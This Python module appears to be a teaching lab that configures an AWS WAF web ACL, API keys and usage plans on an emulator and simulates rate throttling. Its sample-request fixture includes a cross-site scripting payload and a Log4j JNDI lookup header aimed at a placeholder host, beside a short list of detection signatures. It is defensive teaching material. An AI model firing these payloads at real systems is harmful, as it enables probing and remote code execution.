"""Edge security and throttling lab: a REST API that requires API keys with stage throttling, a WAF IP set, a web ACL
with IP, geo, rate-based and AWS managed rules, the ACL on the API stage with logging, an evaluation of sample
requests through the ACL, bronze and gold usage plans, and a token-bucket simulation of what each plan lets through.

Floci 2.3.0 enforces the API key (403 without one, or with a key that is in no usage plan) and stores the stage
throttling, IP set, web ACL, association and logging configuration. WAF never blocks a request, duplicate rule
priorities are accepted, managed rule groups can't be listed, and usage plans drop their throttle and quota, so the
lab evaluates the ACL and the throttling itself.
"""

from __future__ import annotations

import ipaddress
import json
import time
from typing import Any
from urllib.error import HTTPError, URLError
from urllib.request import Request, urlopen

from botocore.exceptions import BotoCoreError, ClientError
from django.core.cache import cache

from dashboard.aws import FlociClientFactory, _clean_response

SERVICE = 'wafv2'
LAB_KEY = 'edge-throttling'
CACHE_PREFIX = f'floci-lab:{SERVICE}:{LAB_KEY}:'
REGION = 'us-east-1'
ACCOUNT = '000000000000'
SCOPE = 'REGIONAL'
TAGS = [{'Key': 'Lab', 'Value': LAB_KEY}]

API = 'lab-edge-api'
STAGE = 'prod'
PATH = 'quotes'
STAGE_THROTTLE = {'rateLimit': 50.0, 'burstLimit': 100}

IP_SET = 'lab-edge-blocked-ips'
BLOCKED_ADDRESSES = ['203.0.113.0/24', '198.51.100.7/32']
ACL = 'lab-edge-acl'
DUP_ACL = 'lab-edge-dup-priority'
RATE_LIMIT = 100
RATE_WINDOW = 300
GEO_BLOCKED = ['KP']
LOG_GROUP = 'aws-waf-logs-lab-edge'
LOG_GROUP_ARN = f'arn:aws:logs:{REGION}:{ACCOUNT}:log-group:{LOG_GROUP}'


def _visibility(metric: str) -> dict[str, Any]:
    return {'SampledRequestsEnabled': True, 'CloudWatchMetricsEnabled': True, 'MetricName': metric}


def acl_rules(ip_set_arn: str) -> list[dict[str, Any]]:
    return [
        {'Name': 'block-bad-ips', 'Priority': 0, 'Action': {'Block': {}},
         'Statement': {'IPSetReferenceStatement': {'ARN': ip_set_arn}}, 'VisibilityConfig': _visibility('blockBadIps')},
        {'Name': 'geo-block', 'Priority': 1, 'Action': {'Block': {}},
         'Statement': {'GeoMatchStatement': {'CountryCodes': GEO_BLOCKED}}, 'VisibilityConfig': _visibility('geoBlock')},
        {'Name': 'rate-limit', 'Priority': 2,
         'Action': {'Block': {'CustomResponse': {'ResponseCode': 429}}},
         'Statement': {'RateBasedStatement': {'Limit': RATE_LIMIT, 'EvaluationWindowSec': RATE_WINDOW,
                                              'AggregateKeyType': 'IP'}},
         'VisibilityConfig': _visibility('rateLimit')},
        {'Name': 'aws-common', 'Priority': 3, 'OverrideAction': {'None': {}},
         'Statement': {'ManagedRuleGroupStatement': {'VendorName': 'AWS', 'Name': 'AWSManagedRulesCommonRuleSet'}},
         'VisibilityConfig': _visibility('awsCommon')},
        {'Name': 'aws-bad-inputs', 'Priority': 4, 'OverrideAction': {'None': {}},
         'Statement': {'ManagedRuleGroupStatement': {'VendorName': 'AWS',
                                                     'Name': 'AWSManagedRulesKnownBadInputsRuleSet'}},
         'VisibilityConfig': _visibility('awsBadInputs')},
    ]


# A few signatures from each managed rule group, enough to show which group answers which attack.
MANAGED_SIGNATURES = {
    'AWSManagedRulesCommonRuleSet': [('CrossSiteScripting_QUERYARGUMENTS', '<script'),
                                     ('GenericLFI_QUERYARGUMENTS', '../')],
    'AWSManagedRulesKnownBadInputsRuleSet': [('Log4JRCE_HEADER', '${jndi:'),
                                             ('JavaDeserializationRCE_HEADER', 'rO0AB')],
}
SAMPLE_REQUESTS = [
    {'Name': 'partner, normal', 'ip': '192.0.2.10', 'country': 'US', 'query': 'symbol=AMZN', 'headers': {},
     'count': 1, 'Expected': 'ALLOW'},
    {'Name': 'known bad address', 'ip': '203.0.113.9', 'country': 'US', 'query': 'symbol=AMZN', 'headers': {},
     'count': 1, 'Expected': 'BLOCK:block-bad-ips'},
    {'Name': 'blocked country', 'ip': '192.0.2.44', 'country': 'KP', 'query': 'symbol=AMZN', 'headers': {},
     'count': 1, 'Expected': 'BLOCK:geo-block'},
    {'Name': 'cross-site scripting', 'ip': '192.0.2.50', 'country': 'DE',
     'query': 'symbol=<script>alert(1)</script>', 'headers': {}, 'count': 1, 'Expected': 'BLOCK:aws-common'},
    {'Name': 'Log4j probe', 'ip': '192.0.2.60', 'country': 'BR', 'query': 'symbol=AMZN',
     'headers': {'User-Agent': '${jndi:ldap://198.51.100.9/a}'}, 'count': 1, 'Expected': 'BLOCK:aws-bad-inputs'},
    {'Name': 'scraper, 150 requests in 5 minutes', 'ip': '192.0.2.20', 'country': 'US', 'query': 'symbol=AMZN',
     'headers': {}, 'count': 150, 'Expected': 'ALLOW 100, BLOCK:rate-limit 50'},
]

PLANS = {
    'lab-edge-bronze': {'key': 'lab-edge-bronze-key', 'throttle': {'rateLimit': 5.0, 'burstLimit': 10},
                        'quota': {'limit': 1000, 'period': 'MONTH'}},
    'lab-edge-gold': {'key': 'lab-edge-gold-key', 'throttle': {'rateLimit': 50.0, 'burstLimit': 100},
                      'quota': {'limit': 100000, 'period': 'MONTH'}},
}
UNPLANNED_KEY = 'lab-edge-unplanned-key'
# 40 requests at once, then one every 0.1 s for 3 s.
BURST_ARRIVALS = [0.0] * 40 + [round(0.1 * index, 1) for index in range(1, 31)]

LAYERS = [
    ('Allow only HTTPS from the load balancer to the app instances', 'Security group'),
    ('Deny one subnet-wide address range at the subnet boundary, stateless', 'Network ACL'),
    ('Block SQL injection and cross-site scripting in HTTP requests', 'AWS WAF'),
    ('Stop one client IP from sending more than 100 requests in 5 minutes', 'AWS WAF rate-based rule'),
    ('Cap a partner at 5 requests per second and 1,000 a month', 'API Gateway usage plan'),
    ('Get DDoS cost protection and a response team for a large layer 3/4 attack', 'AWS Shield Advanced'),
    ('Protect every account from common network floods at no charge', 'AWS Shield Standard'),
    ('Serve content only to viewers in some countries from the CDN', 'CloudFront geographic restrictions'),
]

API_COMMAND = (
    f'aws apigateway create-rest-api --name {API} --endpoint-configuration types=REGIONAL\n'
    f'aws apigateway put-method --rest-api-id <api-id> --resource-id <{PATH}> --http-method GET '
    '--authorization-type NONE --api-key-required\n'
    'aws apigateway put-integration ... --type MOCK\n'
    f'aws apigateway create-deployment --rest-api-id <api-id> --stage-name {STAGE}\n'
    f'aws apigateway update-stage --rest-api-id <api-id> --stage-name {STAGE} --patch-operations '
    f'op=replace,path=/*/*/throttling/rateLimit,value={STAGE_THROTTLE["rateLimit"]:g} '
    f'op=replace,path=/*/*/throttling/burstLimit,value={STAGE_THROTTLE["burstLimit"]}'
)
IP_SET_COMMAND = (
    f'aws wafv2 create-ip-set --name {IP_SET} --scope {SCOPE} --ip-address-version IPV4 '
    f'--addresses {" ".join(BLOCKED_ADDRESSES)}'
)
ACL_COMMAND = (
    f'aws wafv2 create-web-acl --name {ACL} --scope {SCOPE} --default-action Allow={{}} '
    '--rules file://edge-rules.json --visibility-config SampledRequestsEnabled=true,'
    f'CloudWatchMetricsEnabled=true,MetricName=labEdgeAcl\n'
    f'aws logs create-log-group --log-group-name {LOG_GROUP}\n'
    f'aws wafv2 put-logging-configuration --logging-configuration ResourceArn=<acl-arn>,'
    f'LogDestinationConfigs={LOG_GROUP_ARN}'
)
ASSOCIATE_COMMAND = (
    f'aws wafv2 associate-web-acl --web-acl-arn <acl-arn> --resource-arn '
    f'arn:aws:apigateway:{REGION}::/restapis/<api-id>/stages/{STAGE}\n'
    f'aws wafv2 get-web-acl-for-resource --resource-arn arn:aws:apigateway:{REGION}::/restapis/<api-id>/stages/{STAGE}'
)
EVALUATE_COMMAND = (
    f'curl -H "x-api-key: <key>" -H "X-Forwarded-For: 203.0.113.9" '
    f'https://<api-id>.execute-api.{REGION}.amazonaws.com/{STAGE}/{PATH}\n'
    f'aws wafv2 get-sampled-requests --web-acl-arn <acl-arn> --rule-metric-name rateLimit --scope {SCOPE} ...'
)
PLANS_COMMAND = (
    'aws apigateway create-usage-plan --name lab-edge-bronze --api-stages apiId=<api-id>,stage=prod '
    '--throttle rateLimit=5,burstLimit=10 --quota limit=1000,period=MONTH   # and lab-edge-gold 50/100, 100000\n'
    'aws apigateway create-api-key --name lab-edge-bronze-key --enabled\n'
    'aws apigateway create-usage-plan-key --usage-plan-id <plan-id> --key-id <key-id> --key-type API_KEY\n'
    f'curl -H "x-api-key: <key>" https://<api-id>.execute-api.{REGION}.amazonaws.com/{STAGE}/{PATH}'
)
THROTTLE_COMMAND = '# Replay 40 requests at once, then 10 a second for 3 s, against each plan\'s token bucket'

LAB = {
    'service': SERVICE,
    'key': LAB_KEY,
    'title': 'Protect and throttle an API with AWS WAF and API Gateway usage plans',
    'description': (
        'Require API keys on a REST API with stage throttling, block bad addresses, a country, request floods, '
        'cross-site scripting and Log4j probes with a WAF web ACL on the API stage, give partners bronze and gold '
        'usage plans, and work out what each plan lets through in a burst.'
    ),
    'steps': [
        {
            'key': 'quotes-api',
            'title': 'Create a quotes API that requires an API key, with stage throttling',
            'command': API_COMMAND,
            'explanation': (
                'GET /quotes requires an x-api-key header, and the prod stage throttles every method at 50 requests '
                'per second with a burst of 100 (beyond that callers get 429). Account-level throttling (10,000 per '
                'second by default) sits above stage and method limits. How Floci emulates this: the key '
                'requirement is enforced (403 without a key); stage throttling is stored but not enforced.'
            ),
        },
        {
            'key': 'usage-tiers',
            'title': 'Give partners bronze and gold usage plans',
            'command': PLANS_COMMAND,
            'explanation': (
                'Usage plans meter API keys: bronze allows 5 requests per second (burst 10) and 1,000 a month, gold '
                '50 per second (burst 100) and 100,000 a month. A key that is in no plan for the stage is refused. '
                'How Floci emulates this: keys are enforced (200 with a planned key, 403 with no key or an unplanned '
                'one), but plans read back with only their name, so the step keeps what it sent.'
            ),
        },
        {
            'key': 'ip-set',
            'title': 'List known bad addresses in a WAF IP set',
            'command': IP_SET_COMMAND,
            'explanation': (
                'An IP set holds CIDR ranges that rules reference, so you can update the list without editing the '
                'rules. A REGIONAL set protects ALB, API Gateway, AppSync and Cognito in one Region; CLOUDFRONT '
                'scope lives in us-east-1. How Floci emulates this: the IP set is stored and read back.'
            ),
        },
        {
            'key': 'web-acl',
            'title': 'Build a web ACL with IP, geo, rate-based, and managed rules',
            'command': ACL_COMMAND,
            'explanation': (
                'Rules run in priority order and the first Block or Allow wins; anything unmatched gets the default '
                'action (Allow here). The rate-based rule blocks an IP that sends more than 100 requests in 5 '
                'minutes, with a 429 response. AWS managed rule groups cover common attacks (cross-site scripting, '
                'path traversal) and known bad inputs (Log4j). Logs go to a log group named aws-waf-logs-*. How '
                'Floci emulates this: the ACL and logging are stored, but duplicate priorities are accepted, so the '
                'step checks the rules itself.'
            ),
        },
        {
            'key': 'associate',
            'title': 'Attach the web ACL to the API stage',
            'command': ASSOCIATE_COMMAND,
            'explanation': (
                'A regional web ACL attaches to an API Gateway REST API stage, an ALB, AppSync or Cognito; each '
                'resource has at most one ACL. For a CloudFront distribution the ACL has CLOUDFRONT scope instead. '
                'How Floci emulates this: the association is stored and read back.'
            ),
        },
        {
            'key': 'waf-evaluation',
            'title': 'See which rule stops each sample request',
            'command': EVALUATE_COMMAND,
            'explanation': (
                'Six requests show each rule: a normal partner call, a known bad address, a blocked country, a '
                'cross-site scripting attempt, a Log4j probe, and a scraper sending 150 requests in five minutes. '
                'How Floci emulates this: WAF never blocks (a request from a blocked address gets 200) and sampled '
                'requests are unsupported, so the step evaluates the requests against the ACL itself.'
            ),
        },
        {
            'key': 'throttling',
            'title': 'Work out what each plan lets through in a burst, and which layer does what',
            'command': THROTTLE_COMMAND,
            'explanation': (
                'API Gateway throttles with a token bucket: the burst limit is the bucket size and the rate limit '
                'refills it each second; when it is empty callers get 429 Too Many Requests and should retry with '
                'backoff. Quotas count requests per day, week or month. How Floci emulates this: throttling is not '
                'enforced, so the step replays a burst against each plan\'s bucket itself, then matches each need '
                'to the layer that meets it.'
            ),
        },
    ],
}

LABS = [LAB]
STEP_KEYS = [step['key'] for step in LAB['steps']]


# ── Clients, markers, results ────────────────────────────────────────────────

def _client(name: str):
    return FlociClientFactory().client(name)


def _code(exc: ClientError) -> str:
    return exc.response.get('Error', {}).get('Code') or ''


def _marker(step: str, value: Any) -> None:
    cache.set(CACHE_PREFIX + step, _clean_response(value), timeout=86400)


def _marked(step: str) -> Any:
    return cache.get(CACHE_PREFIX + step)


def _result(step: str, command: str, response: Any, verified: bool, message: str, started: float) -> dict[str, Any]:
    clean = _clean_response(response)
    return {
        'service': SERVICE,
        'lab': LAB_KEY,
        'step': step,
        'command': command,
        'exit_code': 0,
        'stdout': json.dumps(clean, indent=2, default=str),
        'stderr': '',
        'json': clean,
        'duration_ms': round((time.perf_counter() - started) * 1000),
        'verified': verified,
        'verification': {'status': 'passed' if verified else 'failed', 'message': message},
    }


def _url(api_id: str) -> str:
    endpoint = FlociClientFactory().endpoint_url.rstrip('/')
    return f'{endpoint}/restapis/{api_id}/{STAGE}/_user_request_/{PATH}'


def _call(api_id: str, headers: dict[str, str] | None = None) -> int | None:
    request = Request(_url(api_id), headers=headers or {}, method='GET')
    try:
        with urlopen(request, timeout=30) as response:
            return response.status
    except HTTPError as exc:
        return exc.code
    except URLError:
        return None


# ── Pure logic: rules, WAF evaluation, token bucket ─────────────────────────

def acl_problems(rules: list[dict[str, Any]]) -> list[str]:
    problems = []
    priorities = [rule.get('Priority') for rule in rules]
    duplicates = sorted({priority for priority in priorities if priorities.count(priority) > 1})
    if duplicates:
        problems.append(f'duplicate priorities {duplicates}')
    names = [rule.get('Name') for rule in rules]
    if len(set(names)) != len(names):
        problems.append('duplicate rule names')
    for rule in rules:
        managed = 'ManagedRuleGroupStatement' in (rule.get('Statement') or {})
        if managed and 'OverrideAction' not in rule:
            problems.append(f'{rule.get("Name")}: a rule group needs OverrideAction, not Action')
        if not managed and 'Action' not in rule:
            problems.append(f'{rule.get("Name")}: needs an Action')
    return problems


def _statement_matches(statement: dict[str, Any], request: dict[str, Any], ip_sets: dict[str, list[str]],
                       rate_counts: dict[str, int]) -> str | None:
    """Returns a label when the statement matches the request, else None."""
    if 'IPSetReferenceStatement' in statement:
        cidrs = ip_sets.get(statement['IPSetReferenceStatement']['ARN'], [])
        ip = ipaddress.ip_address(request['ip'])
        return 'ip' if any(ip in ipaddress.ip_network(cidr) for cidr in cidrs) else None
    if 'GeoMatchStatement' in statement:
        return 'geo' if request['country'] in statement['GeoMatchStatement']['CountryCodes'] else None
    if 'RateBasedStatement' in statement:
        limit = statement['RateBasedStatement']['Limit']
        return 'rate' if rate_counts.get(request['ip'], 0) > limit else None
    if 'ManagedRuleGroupStatement' in statement:
        group = statement['ManagedRuleGroupStatement']['Name']
        excluded = {item['Name'] for item in statement['ManagedRuleGroupStatement'].get('ExcludedRules', [])}
        haystack = ' '.join([request.get('query', ''), *request.get('headers', {}).values()])
        for rule_name, signature in MANAGED_SIGNATURES.get(group, []):
            if rule_name not in excluded and signature in haystack:
                return rule_name
    return None


def evaluate_waf(rules: list[dict[str, Any]], request: dict[str, Any], ip_sets: dict[str, list[str]],
                 rate_counts: dict[str, int] | None = None, default: str = 'ALLOW') -> tuple[str, str | None]:
    """The first matching rule by priority decides; Count and rule-group None overrides let managed blocks through."""
    for rule in sorted(rules, key=lambda item: item.get('Priority', 0)):
        matched = _statement_matches(rule.get('Statement') or {}, request, ip_sets, rate_counts or {})
        if not matched:
            continue
        action = rule.get('Action') or {}
        override = rule.get('OverrideAction') or {}
        if 'Count' in action or 'Count' in override:
            continue
        if 'Allow' in action:
            return 'ALLOW', rule['Name']
        return 'BLOCK', rule['Name']
    return default, None


def replay(rules: list[dict[str, Any]], sample: dict[str, Any], ip_sets: dict[str, list[str]]) -> str:
    """Send a sample `count` times from one IP inside one rate window and summarize the outcomes."""
    outcomes: dict[str, int] = {}
    counts: dict[str, int] = {}
    for _ in range(sample['count']):
        counts[sample['ip']] = counts.get(sample['ip'], 0) + 1
        action, rule = evaluate_waf(rules, sample, ip_sets, counts)
        label = action if not rule or action == 'ALLOW' else f'{action}:{rule}'
        outcomes[label] = outcomes.get(label, 0) + 1
    if len(outcomes) == 1 and sample['count'] == 1:
        return next(iter(outcomes))
    return ', '.join(f'{label} {count}' for label, count in sorted(outcomes.items()))


def token_bucket(rate: float, burst: int, arrivals: list[float]) -> dict[str, int]:
    tokens, last, allowed = float(burst), 0.0, 0
    for at in sorted(arrivals):
        tokens = min(float(burst), tokens + (at - last) * rate)
        last = at
        if tokens >= 1:
            tokens -= 1
            allowed += 1
    return {'Allowed': allowed, 'Throttled429': len(arrivals) - allowed}


# ── Lookups ──────────────────────────────────────────────────────────────────

def _api() -> dict[str, Any] | None:
    apis = _client('apigateway').get_rest_apis(limit=500).get('items', [])
    return next((item for item in apis if item.get('name') == API), None)


def _resource(api_id: str) -> dict[str, Any] | None:
    items = _client('apigateway').get_resources(restApiId=api_id, limit=500).get('items', [])
    return next((item for item in items if item.get('path') == f'/{PATH}'), None)


def _stage(api_id: str) -> dict[str, Any] | None:
    try:
        return _client('apigateway').get_stage(restApiId=api_id, stageName=STAGE)
    except ClientError as exc:
        if _code(exc) == 'NotFoundException':
            return None
        raise


def _stage_arn(api_id: str) -> str:
    return f'arn:aws:apigateway:{REGION}::/restapis/{api_id}/stages/{STAGE}'


def _ip_set() -> dict[str, Any] | None:
    sets = _client('wafv2').list_ip_sets(Scope=SCOPE).get('IPSets', [])
    summary = next((item for item in sets if item['Name'] == IP_SET), None)
    if not summary:
        return None
    return _client('wafv2').get_ip_set(Name=IP_SET, Scope=SCOPE, Id=summary['Id'])


def _acl(name: str = ACL) -> dict[str, Any] | None:
    acls = _client('wafv2').list_web_acls(Scope=SCOPE).get('WebACLs', [])
    summary = next((item for item in acls if item['Name'] == name), None)
    if not summary:
        return None
    return _client('wafv2').get_web_acl(Name=name, Scope=SCOPE, Id=summary['Id'])


def _logging(acl_arn: str) -> dict[str, Any] | None:
    try:
        return _client('wafv2').get_logging_configuration(ResourceArn=acl_arn).get('LoggingConfiguration')
    except ClientError as exc:
        if _code(exc) in ('WAFNonexistentItemException',):
            return None
        raise


def _acl_for_stage(api_id: str) -> dict[str, Any] | None:
    try:
        return _client('wafv2').get_web_acl_for_resource(ResourceArn=_stage_arn(api_id)).get('WebACL')
    except ClientError as exc:
        if _code(exc) in ('WAFNonexistentItemException',):
            return None
        raise


def _plans() -> dict[str, dict[str, Any]]:
    plans = _client('apigateway').get_usage_plans(limit=500).get('items', [])
    return {item['name']: item for item in plans if item.get('name') in PLANS}


def _keys() -> dict[str, dict[str, Any]]:
    names = {spec['key'] for spec in PLANS.values()} | {UNPLANNED_KEY}
    keys = _client('apigateway').get_api_keys(limit=500, includeValues=True).get('items', [])
    return {item['name']: item for item in keys if item.get('name') in names}


def _plan_key_names(plan_id: str) -> list[str]:
    return [item.get('name') for item in _client('apigateway').get_usage_plan_keys(
        usagePlanId=plan_id, limit=500).get('items', [])]


# ── Checks ───────────────────────────────────────────────────────────────────

def _check_api() -> tuple[bool, str]:
    api = _api()
    if not api:
        return False, f'REST API {API} was not found.'
    resource = _resource(api['id'])
    method = ((resource or {}).get('resourceMethods') or {}).get('GET')
    if method is None:
        return False, f'{API} needs GET /{PATH}.'
    full = _client('apigateway').get_method(restApiId=api['id'], resourceId=resource['id'], httpMethod='GET')
    if not full.get('apiKeyRequired'):
        return False, f'GET /{PATH} must require an API key.'
    stage = _stage(api['id'])
    if not stage:
        return False, f'Deploy {API} to {STAGE}.'
    settings = (stage.get('methodSettings') or {}).get('*/*') or {}
    if settings.get('throttlingRateLimit') != STAGE_THROTTLE['rateLimit'] or \
            settings.get('throttlingBurstLimit') != STAGE_THROTTLE['burstLimit']:
        return False, f'{STAGE} must throttle */* at {STAGE_THROTTLE["rateLimit"]:g} per second, burst {STAGE_THROTTLE["burstLimit"]}.'
    return True, (f'GET /{PATH} on {API} requires an API key, and {STAGE} throttles every method at '
                  f'{STAGE_THROTTLE["rateLimit"]:g} per second with a burst of {STAGE_THROTTLE["burstLimit"]}.')


def _check_ip_set() -> tuple[bool, str]:
    ip_set = _ip_set()
    if not ip_set:
        return False, f'IP set {IP_SET} was not found.'
    addresses = sorted(ip_set['IPSet'].get('Addresses', []))
    if addresses != sorted(BLOCKED_ADDRESSES):
        return False, f'{IP_SET} must hold {", ".join(BLOCKED_ADDRESSES)}.'
    return True, f'{IP_SET} holds {", ".join(BLOCKED_ADDRESSES)}.'


def _check_acl() -> tuple[bool, str]:
    acl, ip_set = _acl(), _ip_set()
    if not acl or not ip_set:
        return False, f'Web ACL {ACL} (and IP set {IP_SET}) must exist.'
    web_acl = acl['WebACL']
    if 'Allow' not in (web_acl.get('DefaultAction') or {}):
        return False, f'{ACL} must allow by default.'
    rules = web_acl.get('Rules', [])
    expected = acl_rules(ip_set['IPSet']['ARN'])
    by_name = {rule['Name']: rule for rule in rules}
    for rule in expected:
        found = by_name.get(rule['Name'])
        if not found or found.get('Priority') != rule['Priority'] or found.get('Statement') != rule['Statement']:
            return False, f'{ACL} needs rule {rule["Name"]} at priority {rule["Priority"]}.'
    problems = acl_problems(rules)
    if problems:
        return False, f'{ACL}: {"; ".join(problems)}.'
    logging = _logging(web_acl['ARN'])
    if not logging or LOG_GROUP_ARN not in logging.get('LogDestinationConfigs', []):
        return False, f'{ACL} must log to {LOG_GROUP}.'
    if _acl(DUP_ACL):
        return False, f'Delete {DUP_ACL}.'
    return True, (f'{ACL} blocks the IP set, {", ".join(GEO_BLOCKED)}, more than {RATE_LIMIT} requests per IP in '
                  f'{RATE_WINDOW // 60} minutes (429), common attacks and known bad inputs, allows the rest, and logs '
                  f'to {LOG_GROUP}.')


def _check_associate() -> tuple[bool, str]:
    api, acl = _api(), _acl()
    if not api or not acl:
        return False, f'Create {API} and {ACL} first.'
    attached = _acl_for_stage(api['id'])
    if not attached or attached.get('ARN') != acl['WebACL']['ARN']:
        return False, f'Attach {ACL} to {API} stage {STAGE}.'
    return True, f'{ACL} protects {API} stage {STAGE}.'


def _check_evaluation() -> tuple[bool, str]:
    ok, problem = _check_associate()
    if not ok:
        return False, problem
    marker = _marked('waf-evaluation')
    if not marker:
        return False, 'Run the evaluation.'
    return True, marker['message']


def _sent_plans() -> dict[str, Any]:
    return (_marked('usage-tiers') or {}).get('SentPlans') or {}


def _check_tiers() -> tuple[bool, str]:
    plans, keys = _plans(), _keys()
    sent = _sent_plans()
    for name, spec in PLANS.items():
        plan = plans.get(name)
        if not plan:
            return False, f'Usage plan {name} was not found.'
        if spec['key'] not in keys or spec['key'] not in _plan_key_names(plan['id']):
            return False, f'{spec["key"]} must belong to {name}.'
        throttle = plan.get('throttle') or (sent.get(name) or {}).get('throttle')
        quota = plan.get('quota') or (sent.get(name) or {}).get('quota')
        if throttle != spec['throttle'] or quota != spec['quota']:
            return False, f'{name} must throttle at {spec["throttle"]} with quota {spec["quota"]}.'
    if UNPLANNED_KEY not in keys:
        return False, f'Create {UNPLANNED_KEY} (in no plan) to compare.'
    return True, ('lab-edge-bronze (5 per second, burst 10, 1,000 a month) and lab-edge-gold (50 per second, burst '
                  '100, 100,000 a month) each have a partner key.')


def _check_throttling() -> tuple[bool, str]:
    for check in (_check_tiers, _check_associate):
        ok, problem = check()
        if not ok:
            return False, problem
    marker = _marked('throttling')
    if not marker:
        return False, 'Run the simulation.'
    return True, marker['message']


# ── Steps ────────────────────────────────────────────────────────────────────

def step_quotes_api() -> dict[str, Any]:
    started = time.perf_counter()
    gateway = _client('apigateway')
    api = _api() or gateway.create_rest_api(name=API, endpointConfiguration={'types': ['REGIONAL']},
                                            tags={'Lab': LAB_KEY})
    api_id = api['id']
    resource = _resource(api_id)
    if not resource:
        root = next(item for item in gateway.get_resources(restApiId=api_id).get('items', []) if item['path'] == '/')
        resource = gateway.create_resource(restApiId=api_id, parentId=root['id'], pathPart=PATH)
    if 'GET' not in (resource.get('resourceMethods') or {}):
        gateway.put_method(restApiId=api_id, resourceId=resource['id'], httpMethod='GET',
                           authorizationType='NONE', apiKeyRequired=True)
        gateway.put_integration(restApiId=api_id, resourceId=resource['id'], httpMethod='GET', type='MOCK',
                                requestTemplates={'application/json': '{"statusCode": 200}'})
        gateway.put_method_response(restApiId=api_id, resourceId=resource['id'], httpMethod='GET', statusCode='200')
        gateway.put_integration_response(
            restApiId=api_id, resourceId=resource['id'], httpMethod='GET', statusCode='200',
            responseTemplates={'application/json': '{"symbol": "AMZN", "price": 185.20}'})
    if not _stage(api_id):
        gateway.create_deployment(restApiId=api_id, stageName=STAGE)
    gateway.update_stage(restApiId=api_id, stageName=STAGE, patchOperations=[
        {'op': 'replace', 'path': '/*/*/throttling/rateLimit', 'value': f'{STAGE_THROTTLE["rateLimit"]:g}'},
        {'op': 'replace', 'path': '/*/*/throttling/burstLimit', 'value': str(STAGE_THROTTLE['burstLimit'])}])
    without_key = _call(api_id)
    settings = ((_stage(api_id) or {}).get('methodSettings') or {}).get('*/*') or {}
    response = {'ApiId': api_id, 'WithoutKey': without_key,
                'StageThrottle': {key: settings.get(key) for key in ('throttlingRateLimit', 'throttlingBurstLimit')}}
    verified, message = _check_api()
    if verified and without_key != 403:
        verified, message = False, f'A call without a key should get 403, got {without_key}.'
    elif verified:
        message += ' A call without a key got 403. Floci stores the stage throttling but does not enforce it.'
    return _result('quotes-api', API_COMMAND, response, verified, message, started)


def step_ip_set() -> dict[str, Any]:
    started = time.perf_counter()
    waf = _client('wafv2')
    ip_set = _ip_set()
    if not ip_set:
        waf.create_ip_set(Name=IP_SET, Scope=SCOPE, IPAddressVersion='IPV4', Addresses=BLOCKED_ADDRESSES,
                          Description='Known bad addresses', Tags=TAGS)
    elif sorted(ip_set['IPSet'].get('Addresses', [])) != sorted(BLOCKED_ADDRESSES):
        waf.update_ip_set(Name=IP_SET, Scope=SCOPE, Id=ip_set['IPSet']['Id'], Addresses=BLOCKED_ADDRESSES,
                          LockToken=ip_set['LockToken'])
    current = _ip_set() or {}
    response = {'IPSet': {key: (current.get('IPSet') or {}).get(key) for key in ('Name', 'ARN', 'Addresses')}}
    verified, message = _check_ip_set()
    return _result('ip-set', IP_SET_COMMAND, response, verified, message, started)


def step_web_acl() -> dict[str, Any]:
    started = time.perf_counter()
    waf, logs = _client('wafv2'), _client('logs')
    ip_set = _ip_set()
    if not ip_set:
        return _result('web-acl', ACL_COMMAND, {}, False, f'Create {IP_SET} first.', started)
    rules = acl_rules(ip_set['IPSet']['ARN'])
    acl = _acl()
    if not acl:
        waf.create_web_acl(Name=ACL, Scope=SCOPE, DefaultAction={'Allow': {}}, Rules=rules,
                           VisibilityConfig=_visibility('labEdgeAcl'), Tags=TAGS)
    else:
        waf.update_web_acl(Name=ACL, Scope=SCOPE, Id=acl['WebACL']['Id'], DefaultAction={'Allow': {}}, Rules=rules,
                           VisibilityConfig=_visibility('labEdgeAcl'), LockToken=acl['LockToken'])
    acl = _acl()
    try:
        logs.create_log_group(logGroupName=LOG_GROUP, tags={'Lab': LAB_KEY})
    except ClientError as exc:
        if _code(exc) != 'ResourceAlreadyExistsException':
            raise
    waf.put_logging_configuration(LoggingConfiguration={'ResourceArn': acl['WebACL']['ARN'],
                                                        'LogDestinationConfigs': [LOG_GROUP_ARN]})
    # Try two rules with the same priority: AWS refuses this ACL.
    duplicate = [dict(rules[1], Name='geo-block-copy', Priority=rules[1]['Priority'],
                      VisibilityConfig=_visibility('geoBlockCopy')), rules[1]]
    try:
        made = waf.create_web_acl(Name=DUP_ACL, Scope=SCOPE, DefaultAction={'Allow': {}}, Rules=duplicate,
                                  VisibilityConfig=_visibility('dup'), Tags=TAGS)['Summary']
        floci_duplicate = 'accepted'
        waf.delete_web_acl(Name=DUP_ACL, Scope=SCOPE, Id=made['Id'], LockToken=made['LockToken'])
    except ClientError as exc:
        floci_duplicate = _code(exc)
    response = {'Rules': [{key: rule.get(key) for key in ('Name', 'Priority')} for rule in acl['WebACL']['Rules']],
                'Logging': _logging(acl['WebACL']['ARN']),
                'DuplicatePriorityAcl': {'Problems': acl_problems(duplicate), 'Floci': floci_duplicate}}
    verified, message = _check_acl()
    if verified and floci_duplicate == 'accepted':
        message += ' Floci accepted an ACL with two rules at the same priority, which AWS refuses, so the step checks the rules itself.'
    return _result('web-acl', ACL_COMMAND, response, verified, message, started)


def step_associate() -> dict[str, Any]:
    started = time.perf_counter()
    api, acl = _api(), _acl()
    if not api or not acl:
        return _result('associate', ASSOCIATE_COMMAND, {}, False, f'Create {API} and {ACL} first.', started)
    _client('wafv2').associate_web_acl(WebACLArn=acl['WebACL']['ARN'], ResourceArn=_stage_arn(api['id']))
    attached = _acl_for_stage(api['id']) or {}
    response = {'ResourceArn': _stage_arn(api['id']), 'WebACL': attached.get('Name')}
    verified, message = _check_associate()
    return _result('associate', ASSOCIATE_COMMAND, response, verified, message, started)


def step_waf_evaluation() -> dict[str, Any]:
    started = time.perf_counter()
    api, acl, ip_set = _api(), _acl(), _ip_set()
    if not api or not acl or not ip_set:
        return _result('waf-evaluation', EVALUATE_COMMAND, {}, False, 'Build and attach the web ACL first.', started)
    rules = acl['WebACL']['Rules']
    ip_sets = {ip_set['IPSet']['ARN']: ip_set['IPSet'].get('Addresses', [])}
    rows = []
    for sample in SAMPLE_REQUESTS:
        outcome = replay(rules, sample, ip_sets)
        rows.append({'Request': sample['Name'], 'Outcome': outcome, 'Expected': sample['Expected']})
    keys = _keys()
    key = (keys.get(PLANS['lab-edge-gold']['key']) or {}).get('value')
    floci = {}
    if key:
        floci['BlockedAddressStatus'] = _call(api['id'], {'x-api-key': key, 'X-Forwarded-For': '203.0.113.9'})
    sampled: dict[str, Any]
    try:
        _client('wafv2').get_sampled_requests(
